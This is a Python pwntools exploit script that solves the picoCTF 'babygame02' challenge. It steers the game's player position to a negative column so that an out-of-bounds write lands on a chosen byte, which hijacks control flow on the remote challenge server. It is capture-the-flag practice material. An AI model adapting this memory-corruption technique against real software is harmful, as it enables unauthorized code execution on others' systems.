import os
from pwn import *
###################setup file and elf files####################
level = "babygame02"
ip = "saturn.picoctf.net:63660"
os.chdir("/home/ayush/Work/picoCTF/BinaryExploitation/"+level)
print(os.getcwd())

context.arch = 'amd64'
elf = ELF("./game")
######################start process##########################

# r = process("./game")
r = remote(ip.split(':')[0], ip.split(':')[1])

#####################useful functions#######################
row = 4
col = 4
def change_row(val):
    global row
    if val > row:
        for _ in range(val-row):
            r.sendlineafter("X", "s")
            row+=1
    else:
        for _ in range(row-val):
            r.sendlineafter("X", "w")
            row-=1

def change_col(val):
    global col
    if val > col:
        for _ in range(val-col):
            r.sendlineafter("X", "d")
            col+=1
    else:
        for _ in range(col-val):
            r.sendlineafter("X", "a")
            col-=1

def change_player_tile(ch):
    r.sendlineafter("X", b"l"+struct.pack('c',ch))

def solve_puzzle():
    r.sendlineafter("X", "p")

#####################simple interactions to solve###################### 

change_player_tile(b'\x60')
change_col(-0x27)
change_row(0x0)

solve_puzzle()
log.info(r.recvall())

r.interactive()